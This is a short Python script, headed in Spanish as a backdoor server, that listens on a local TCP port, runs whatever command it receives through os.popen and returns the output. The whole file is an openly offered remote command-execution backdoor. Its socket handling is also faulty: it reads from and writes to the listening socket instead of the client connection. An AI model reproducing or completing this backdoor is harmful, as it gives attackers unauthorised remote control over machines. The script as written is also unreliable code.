"""
Uso: Backdoor Servidor
Creado: Andrés Hernández Mata
Version: 1.0.0
Python: 3.9.1
Fecha: 08 Abril 2020
"""

import socket
import sys
import os

localIP = "127.0.0.1"
localPort = 2000
bufferSize = 1024

TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TCPServerSocket.bind((localIP, localPort))
TCPServerSocket.listen()

print("[*] Inicializando servidor...")

while(True):
    cliente, servidor = TCPServerSocket.accept()
    print("[*] Comando recibido...") 
    comando = TCPServerSocket.recv(bufferSize)
    print("[*] Ejecutando comando...")  
    stream = os.popen(comando.decode())
    salida = stream.read()
    print("[*] Enviando la salida...")  
    TCPServerSocket.sendto(str.encode(salida), servidor)

